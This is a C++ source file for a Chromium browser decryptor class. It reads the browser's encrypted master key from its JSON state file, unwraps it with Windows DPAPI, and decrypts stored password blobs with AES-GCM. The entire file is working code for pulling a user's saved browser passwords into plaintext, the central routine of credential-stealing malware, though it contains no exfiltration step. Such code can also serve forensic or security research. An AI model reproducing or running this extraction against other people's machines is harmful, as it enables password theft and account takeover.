#include "includes\ChromiumDecryptor.h"

DATA_BLOB* master_key_blob;

ChromiumDecryptor::ChromiumDecryptor() {}
ChromiumDecryptor::~ChromiumDecryptor() {
	// Free memory allocated for master_key_blob if it's not null
	if (master_key_blob != nullptr) {
		LocalFree(master_key_blob->pbData);
		delete master_key_blob;
	}
}

bool ChromiumDecryptor::ChromiumDecryptorInit(std::string path)
{
	std::string key_base64 = get_browser_key(path);
	if (key_base64 == "")
	{
		return false;
	}

	master_key_blob = UnportectMasterKey(key_base64);
	if (master_key_blob != nullptr)
	{
		//std::cout << "KEY BLOB DECRYPTED: "<< path << std::endl;
		return true;
	}

	return false;
}

std::string ChromiumDecryptor::get_browser_key(std::string path)
{
	std::string enc_key_base64;

	enc_key_base64 = read_json(path);
	if (!enc_key_base64.empty())
	{
		//std::cout << "ENCRYPTED KEY: " << enc_key_base64 << std::endl;
		return enc_key_base64;
	}
	return "";
}

DATA_BLOB* ChromiumDecryptor::UnportectMasterKey(std::string MasterString)
{
	std::vector<unsigned char> binaryKey;
	DWORD binaryKeySize = 0;


	// Decoding the base64 encoded string to binary data.
	if (!CryptStringToBinaryA(MasterString.c_str(), 0, CRYPT_STRING_BASE64, NULL, &binaryKeySize, NULL, NULL))
	{
		std::cout << "CryptStringToBinaryA [1] : Failed to convert BASE64 private key. \n";
		return nullptr;
	}

	binaryKey.resize(binaryKeySize);
	if (!CryptStringToBinaryA(MasterString.c_str(), 0, CRYPT_STRING_BASE64, binaryKey.data(), &binaryKeySize, NULL, NULL))
	{
		std::cout << "CryptStringToBinaryA [2] : Failed to convert BASE64 private key. \n";
		return nullptr;
	}

	// Calling CryptUnprotectData to unprotect the master key.
	// Out DATA_BLOB will hold the key we need with its length.
	DATA_BLOB in;
	DATA_BLOB* out = new DATA_BLOB;
	in.pbData = binaryKey.data() + 5; // Remove DPAPI
	in.cbData = binaryKeySize - 5;

	if (!CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, out))
	{
		std::cout << "CryptUnprotectData [1] : Failed to convert BASE64 private key. \n";
		return nullptr;
	}
	return out;
}

std::string ChromiumDecryptor::AESDecrypter(std::vector<BYTE> EncryptedBlob)
{
	try
	{
		BCRYPT_ALG_HANDLE hAlgorithm = 0;
		BCRYPT_KEY_HANDLE hKey = 0;
		NTSTATUS status = 0;
		SIZE_T EncryptedBlobSize = EncryptedBlob.size();
		SIZE_T TagOffset = EncryptedBlobSize - 15;
		ULONG PlainTextSize = 0;

		std::vector<BYTE> CipherPass(EncryptedBlobSize); // hold the passwords ciphertext.
		std::vector<BYTE> PlainText;
		std::vector<BYTE> IV(IV_SIZE); // Will hold initial vector data.

		std::string meta(EncryptedBlob.begin(), EncryptedBlob.begin() + 3);

		// Compare the first 3 bytes with the string "v20"
		if (meta == "v20")
			return "";

		// Parse iv and password from the buffer using std::copy
		std::copy(EncryptedBlob.data() + 3, EncryptedBlob.data() + 3 + IV_SIZE, IV.begin());
		std::copy(EncryptedBlob.data() + 15, EncryptedBlob.data() + EncryptedBlobSize, CipherPass.begin());

		// Open algorithm provider for decryption
		status = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
		if (!BCRYPT_SUCCESS(status))
		{
			std::cout << "BCryptOpenAlgorithmProvider failed with status: " << status << std::endl;
			return "";
		}

		// Set chaining mode for decryption
		status = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (UCHAR*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
		if (!BCRYPT_SUCCESS(status))
		{
			std::cout << "BCryptSetProperty failed with status: " << status << std::endl;
			BCryptCloseAlgorithmProvider(hAlgorithm, 0);
			return "";
		}

		// Generate symmetric key
		status = BCryptGenerateSymmetricKey(hAlgorithm, &hKey, NULL, 0, master_key_blob->pbData, master_key_blob->cbData, 0);
		if (!BCRYPT_SUCCESS(status))
		{
			std::cout << "BcryptGenertaeSymmetricKey failed with status: " << status << std::endl;
			BCryptCloseAlgorithmProvider(hAlgorithm, 0);
			return "";
		}

		// Auth cipher mode info
		BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO AuthInfo;
		BCRYPT_INIT_AUTH_MODE_INFO(AuthInfo);
		TagOffset = TagOffset - 16;
		AuthInfo.pbNonce = IV.data();
		AuthInfo.cbNonce = IV_SIZE;
		AuthInfo.pbTag = CipherPass.data() + TagOffset;
		AuthInfo.cbTag = TAG_SIZE;

		// Get size of plaintext buffer
		status = BCryptDecrypt(hKey, CipherPass.data(), TagOffset, &AuthInfo, NULL, 0, NULL, NULL, &PlainTextSize, 0);
		if (!BCRYPT_SUCCESS(status))
		{
			std::cout << "BCryptDecrypt (1) failed with status: " << status << std::endl;
			return "";
		}

		// Allocate memory for the plaintext
		PlainText.resize(PlainTextSize);

		status = BCryptDecrypt(hKey, CipherPass.data(), TagOffset, &AuthInfo, NULL, 0, PlainText.data(), PlainTextSize, &PlainTextSize, 0);
		if (!BCRYPT_SUCCESS(status))
		{
			std::cout << "BCrypt Decrypt (2) failed with status: " << status << std::endl;
			return "";
		}

		// Close the algorithm handle
		BCryptCloseAlgorithmProvider(hAlgorithm, 0);

		return std::string(PlainText.begin(), PlainText.end());
	}
	catch (int e)
	{
		return "";
	}
}

std::string ChromiumDecryptor::read_json(const std::string& filePath) {
	std::ifstream file(filePath);
	if (!file.is_open()) {
		std::cerr << "Failed to open the file: " << filePath << std::endl;
		return "";
	}

	std::regex pattern("\"encrypted_key\"\\s*:\\s*\"([^\"]*)\"");
	std::string line;
	std::smatch match;

	while (std::getline(file, line)) {
		if (std::regex_search(line, match, pattern)) {
			return match[1]; // Return the captured group (value of "encrypted_key")
		}
	}

	std::cerr << "Encrypted key not found in the file." << std::endl;
	return "";
}